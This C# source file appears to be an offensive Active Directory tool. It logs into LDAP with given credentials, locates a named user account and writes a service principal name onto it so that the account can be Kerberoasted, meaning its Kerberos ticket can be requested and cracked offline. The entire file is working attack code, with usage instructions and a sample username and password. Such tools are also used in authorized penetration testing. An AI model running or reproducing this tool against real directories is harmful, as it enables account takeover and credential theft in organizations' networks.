using System;
using System.Collections.Generic;
using System.Text;
using System.DirectoryServices;

/*
 * Authenticates to LDAP using the provided username and password, searches for a target account, and sets the 'serviceprincipalname' (SPN) attribute, allowing the account to be Kerberoasted.
 * Usage: LdapAttributeChanger.exe auth_username auth_password target_account
 * Example: LdapAttributeChanger.exe Alice Summer2020 JoeTarget
 * 
 * @ac3lives, 2021
 */
namespace LdapAttributeChanger
{
    class Program
    {
        static void Main(string[] args)
        {
            string DomainName = Environment.UserDomainName;
            string SearchBase = "LDAP://" + DomainName.Replace(".", ",DC=");
            DirectoryEntry Entry = new DirectoryEntry(SearchBase, args[0], args[1]);
            DirectorySearcher Searcher = new DirectorySearcher(Entry);

            Searcher.SearchScope = SearchScope.Subtree;
            Searcher.PropertiesToLoad.Add("sAMAccountName");
            Searcher.Filter = "(&(objectClass=user)(objectCategory=person)(sAMAccountName=" + args[2] + "))";

            foreach (SearchResult AdObj in Searcher.FindAll())
            {
                try
                {
                    string spnvalue = @"http/exwebsvc";
                    Console.WriteLine("Found user: {0}", Convert.ToString(AdObj.Properties["sAMAccountName"][0]));
                    Console.WriteLine("Setting the serviceprincipalname attribute as {0}", spnvalue);
                    DirectoryEntry user = AdObj.GetDirectoryEntry();
                    user.Properties["serviceprincipalname"].Value = spnvalue;
                    //Can use .Remove to delete the attribute.
                    //user.Properties["serviceprincipalname"].Remove(@"http/exwebsvc");
                    user.CommitChanges();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Error: {0}", e.Message);
                }

            }
        }
    }
}
